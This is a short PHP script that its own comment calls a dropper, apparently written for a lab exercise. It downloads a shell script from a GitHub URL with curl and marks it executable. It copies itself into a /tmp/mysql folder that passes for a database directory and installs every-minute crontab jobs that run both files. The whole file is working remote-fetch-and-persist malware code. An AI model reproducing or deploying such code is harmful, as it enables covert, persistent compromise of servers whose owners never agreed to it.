<?php
$dir = "/tmp/mysql";
if (!is_dir($dir)) mkdir($dir, 0755, true);

$sh = $dir . "/script.sh";
$php = $dir . "/index.php"; // Копия самого дроппера
$log = $dir . "/logi.log";

$gitSh = "https://raw.githubusercontent.com/temaniall/lb4/main/script.sh";
$gitPhp = "https://raw.githubusercontent.com/temaniall/lb4/main/lab4.php"; 

if (!file_exists($sh)) {
    exec("curl -s $gitSh -o $sh");
    chmod($sh, 0755);
}

if (!file_exists($php)) {
    copy(__FILE__, $php);
}

$cron = shell_exec("crontab -l 2>/dev/null");
if (strpos($cron, $sh) === false) {
    $job = "* * * * * $sh\n* * * * * php $php\n";
    exec("(crontab -l 2>/dev/null; echo " . escapeshellarg($job) . ") | crontab -");
}

echo "Скрипт создан, логи в $log, запись в кроне\n";
?>
